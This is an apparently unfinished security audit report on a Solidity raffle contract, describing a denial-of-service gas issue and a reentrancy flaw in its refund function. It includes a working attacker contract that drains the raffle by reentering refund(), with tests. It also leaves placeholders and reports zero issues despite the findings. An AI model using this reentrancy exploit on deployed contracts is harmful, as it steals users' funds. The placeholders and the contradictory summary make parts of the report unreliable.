---
title: Puppy Raffle Audit Report
author: CryptoBog_xyz
date: March 5, 2024
header-includes:
  - \usepackage{titling}
  - \usepackage{graphicx}
---

\begin{titlepage}
    \centering
    \begin{figure}[h]
        \centering
        \includegraphics[width=0.5\textwidth]{logo.pdf} 
    \end{figure}
    \vspace*{2cm}
    {\Huge\bfseries Puppy Raffle Audit Report\par}
    \vspace{1cm}
    {\Large Version 1.0\par}
    \vspace{2cm}
    {\Large\itshape CryptoBog_xyz\par}
    \vfill
    {\large \today\par}
\end{titlepage}

\maketitle

<!-- Your report starts here! -->

Prepared by: [CryptoBog_xyz](https://cyfrin.io)
Lead Auditors: 
- CryptoBog_xyz

# Table of Contents
- [Table of Contents](#table-of-contents)
- [Protocol Summary](#protocol-summary)
- [Disclaimer](#disclaimer)
- [Risk Classification](#risk-classification)
- [Audit Details](#audit-details)
  - [Scope](#scope)
  - [Roles](#roles)
- [Executive Summary](#executive-summary)
  - [Issues found](#issues-found)
- [Findings](#findings)
- [High](#high)
    - [\[S-#\] Title (ROOT CAUSE + IMPACT)](#s--title-root-cause--impact)
    - [\[H-#\] The reset of the `PuppyRaffle::players[playerIndex]` array happens after the external call `PuppyRaffle::sendValue()` which leads to a reentancy situation.](#h--the-reset-of-the-puppyraffleplayersplayerindex-array-happens-after-the-external-call-puppyrafflesendvalue-which-leads-to-a-reentancy-situation)
- [Medium](#medium)
- [Low](#low)
- [Informational](#informational)
- [Gas](#gas)

# Protocol Summary

Protocol does X, Y, Z

# Disclaimer

CryptoBog_xyz makes all effort to find as many vulnerabilities in the code in the given time period, but holds no responsibilities for the findings provided in this document. A security audit by the team is not an endorsement of the underlying business or product. The audit was time-boxed and the review of the code was solely on the security aspects of the Solidity implementation of the contracts.

# Risk Classification

|            |        | Impact |        |     |
| ---------- | ------ | ------ | ------ | --- |
|            |        | High   | Medium | Low |
|            | High   | H      | H/M    | M   |
| Likelihood | Medium | H/M    | M      | M/L |
|            | Low    | M      | M/L    | L   |

We use the [CodeHawks](https://docs.codehawks.com/hawks-auditors/how-to-evaluate-a-finding-severity) severity matrix to determine severity. See the documentation for more details.

# Audit Details 
## Scope 
- Commit Hash: e30d199697bbc822b646d76533b66b7d529b8ef5
- In Scope:

```
./src/
-- PuppyRaffle.sol
```

- Solc Version: 0.7.6
- Chain(s) to deploy contract to: Ethereum

| file                | files | blank | comment | code |
| ------------------- | ----- | ----- | ------- | ---- |
| src/PuppyRaffle.sol | 1     | 30    | 43      | 143  |

## Roles
Owner - Deployer of the protocol, has the power to change the wallet address to which fees are sent through the `changeFeeAddress` function.
Player - Participant of the raffle, has the power to enter the raffle with the `enterRaffle` function and refund value through `refund` function.


# Executive Summary
## Issues found
| Severity      | Number of Issues |
| ------------- | ---------------- |
| High          | 0                |
| Medium        | 0                |
| Low           | 0                |
| Informational | 0                |
| Total         | 0                |

# Findings
# High

### [S-#] Title (ROOT CAUSE + IMPACT)

**Description:** Function `PuppyRaffle.sol::enterRaffle()` has a for-loop which checks for duplicate players and reverts if finds any. 
The problem arises when the `PuppyRaffle.sol::players` array gets big and this could lead to a denial of service (i.e. the function `PuppyRaffle.sol::enterRaffle()` becomes unfinishable).

```solidity
function enterRaffle(address[] memory newPlayers) public payable {
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle"); 
        for (uint256 i = 0; i < newPlayers.length; i++) {
            players.push(newPlayers[i]);
        }

        // Check for duplicates
        for (uint256 i = 0; i < players.length - 1; i++) { 
            for (uint256 j = i + 1; j < players.length; j++) {
                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
            }
        }
        emit RaffleEnter(newPlayers);
    }
```

**Impact:** Denial of Service could lead to the main functionality ("This project is to enter a raffle to win a cute dog NFT.") of the contract being inaccessible. 

**Proof of Concept:** 
In the test suite add the following test which proves that the gas cost of entering the raffle increases with the number of players taking part. 

```solidity
function testDoSAttack() public {
        uint64 numPlayers = 100; // Set the number of players
        address[] memory players = new address[](numPlayers); // Initialize an array for the players
        for (uint128 i = 0; i < numPlayers; i++) {
            players[i] = address(uint160(i)); // Generate unique addresses
        }
        uint256 gasStartFirst = gasleft(); // Record gas before the transaction
        puppyRaffle.enterRaffle{value: entranceFee * numPlayers}(players); // Enter the raffle with the first group of players
        uint256 gasEndFirst = gasleft(); // Record gas after the transaction
        uint256 gasCostFirst = gasStartFirst - gasEndFirst; // Calculate the gas cost of the transaction
        console.log(gasCostFirst); // Log the gas cost

        address[] memory playersTwo = new address[](numPlayers); // Initialize a second array for the players
        for (uint128 i = 0; i < numPlayers; i++) {
            playersTwo[i] = address(uint160(i + numPlayers)); // Generate unique addresses for the second group
        }
        uint256 gasStartSecond = gasleft(); // Record gas before the second transaction
        puppyRaffle.enterRaffle{value: entranceFee * numPlayers}(playersTwo); // Enter the raffle with the second group of players
        uint256 gasEndSecond = gasleft(); // Record gas after the second transaction
        uint256 gasCostSecond = gasStartSecond - gasEndSecond; // Calculate the gas cost of the second transaction
        console.log(gasCostSecond); // Log the gas cost of the second transaction

        assert(gasCostSecond > gasCostFirst); // Assert that the gas cost for the second transaction is higher
    }
```

**Recommended Mitigation:** 

### [H-#] The reset of the `PuppyRaffle::players[playerIndex]` array happens after the external call `PuppyRaffle::sendValue()` which leads to a reentancy situation.

**Description:** In the function `PuppyRaffle::refund()` the array which stores the active users (i.e. those who have not yet refunded their `PuppyRaffle::entranceFee`) is updated after the external call `PuppyRaffle::sendValue()`. In that case a user might implement a malicious contract that would reenter the `PuppyRaffle::refund()` after receiving the entrance fee and clear out the contract's balance.

Contract Code: 
```soliditiy
    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

@>      payable(msg.sender).sendValue(entranceFee);

@>      players[playerIndex] = address(0);
        emit RaffleRefunded(playerAddress);
    }

```

**Impact:** That particulat reentrancy attack could result in a complete loss of the funds stored in the `PuppyRaffle` contract. 

**Proof of Concept:** 
1. Create a Contract that will exploit the vulnerability:

```solidity
contract Attack {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 attackerIndex;

    constructor(PuppyRaffle _puppyRaffle){
        puppyRaffle = _puppyRaffle;
        entranceFee = puppyRaffle.entranceFee();
    } 

    function attack() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }

    receive() external payable {
        if(address(puppyRaffle).balance >= entranceFee){
            puppyRaffle.refund(attackerIndex);
        }
    }
}
```

2. Create a testcase to check whether the aforementioned contract was able to successfully exploit:

The `PuppyRaffleTest.t.sol::testCanReenter()` function tests the PuppyRaffle contract's vulnerability to a reentrancy attack by simulating an attack scenario. It involves creating an attacker contract that exploits the refund function, checking the contract's balances before and after the attack to assess the impact.

```solidity
function testCanReenter() public playerEntered {
        address[] memory players = new address[](4);
        players[0] = address(10);
        players[1] = address(11);
        players[2] = address(12);
        players[3] = address(13);

        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        Attack attackerContract = new Attack(puppyRaffle);
        address attackerUser = makeAddr("attackerUser");
        vm.deal(attackerUser, 1 ether);

        uint256 startAttackerContractBalance = address(attackerContract).balance;
        uint256 startPuppyRaffleContractBalance = address(puppyRaffle).balance;

        vm.prank(attackerUser);
        attackerContract.attack{value: entranceFee}();

        console.log("Attacker Balance start: ", startAttackerContractBalance);
        console.log("PuppyRaffle Balance start: ", startPuppyRaffleContractBalance);
        
        console.log("Attacker Contract balance after attack: ", address(attackerContract).balance);
        console.log("PuppyRaffle Contract balance after attack: ", address(puppyRaffle).balance);
    }
```

**Recommended Mitigation:** To mitigate the reentrancy risk in the `PuppyRaffle::refund()` function, consider the following recommendations:

1. *Update State Before External Calls*: Move the state update (`players[playerIndex] = address(0);`) before the external call (`payable(msg.sender).sendValue(entranceFee);`). This ensures that the contract's state is updated before any external calls are made, reducing the risk of reentrancy.

```diff
    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
+       players[playerIndex] = address(0);
        payable(msg.sender).sendValue(entranceFee);

-       players[playerIndex] = address(0);
        emit RaffleRefunded(playerAddress);
    }

```

2. *Use Reentrancy Guards*: Implement a reentrancy guard, such as the `nonReentrant` modifier from OpenZeppelin's `ReentrancyGuard` contract, to prevent reentrant calls. This modifier can be applied to functions that are susceptible to reentrancy attacks.

3.  *Consider Using Pull Over Push Payments*: Instead of sending funds directly to the user within the `refund` function, consider implementing a system where users can withdraw their funds. This approach can help mitigate reentrancy risks by separating the state update from the external call.


# Medium
# Low 
# Informational
# Gas 